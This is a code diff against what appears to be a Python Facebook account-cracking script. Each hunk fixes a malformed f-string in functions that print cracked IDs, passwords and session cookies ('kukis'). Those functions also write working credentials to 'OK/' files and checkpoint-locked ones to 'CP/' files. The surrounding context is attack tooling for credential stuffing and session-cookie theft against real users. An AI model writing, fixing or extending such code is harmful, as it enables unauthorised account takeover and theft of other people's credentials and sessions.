@@ -1136,7 +1136,7 @@ def rr071(idf,pwv):
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
 				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\rH2}━━⫸{B2} ✶{x} PW : {H}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
@@ -1178,14 +1178,14 @@ def rr072(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\rH2}━━⫸{B2} ✶{x} PW : {H}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} KUKIS : {H}{kuki}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\rH2}━━⫸{B2} ✶{x} PW : {H}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1235,7 +1235,7 @@ def rr073(idf,pwv):
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
 				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\rH2}━━⫸{B2} ✶{x} PW : {H}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1244,7 +1244,7 @@ def rr073(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
 				print(f"\r{H2}━━⫸{B2} ✶{x} ID : {B}{uid}|{pw}")
-				print(f"\rH2}━━⫸{B2} ✶{x} PW : {H}{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{x} PW : {H}{pw}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} KUKIS : {H}{kuki}")
 				print(f"\r{H2}╰─▶{B2} ✶{x} UGENT : {U}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
